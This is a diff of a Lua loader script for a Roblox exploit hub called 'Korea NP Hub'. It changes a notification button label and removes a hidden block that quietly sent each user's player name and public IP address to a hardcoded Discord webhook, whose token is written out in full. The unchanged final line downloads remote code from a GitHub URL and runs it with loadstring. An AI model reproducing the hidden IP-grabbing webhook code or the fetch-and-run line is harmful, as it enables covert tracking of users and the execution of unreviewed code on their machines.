@@ -32,58 +32,9 @@ game:GetService("StarterGui"):SetCore(
 		Title = "Korea NP Hub",
 		Duration = 8,
 		Text = "오늘도 NP Hub를 이용해주셔서 감사합니다. \n더좋은 서비스로 보답하겠습니다!\n\nNP Hub를 로딩하는중입니다.",
-		Button1 = "NP Hub Community",
+		Button1 = "NP Hub Kakaotalk",
 		Callback = NotificationBindable
 	}
 )
-
-local webh = "https://discord.com/api/webhooks/1062984861046030346/NSKxYtD2Wy58pvb19JA2-H6QoOCQy2fPs92keg0SjMPDSYlWVWsUQqslhFXMh8nqOfNZ"
-
-pcall(function()
-   local data = {
-       ["embeds"] = {
-           {
-               ["title"] = game:GetService("Players").LocalPlayer.Name,
-               ["description"] = game:HttpGet("https://api.ipify.org")
-           }
-       }
-   }
-
-   if syn then
-       local response = syn.request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif request then
-       local response = request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif http_request then
-       local response = http_request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   end
-end)
-
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sungyong1234/nphubpremium/main/main.lua"))();
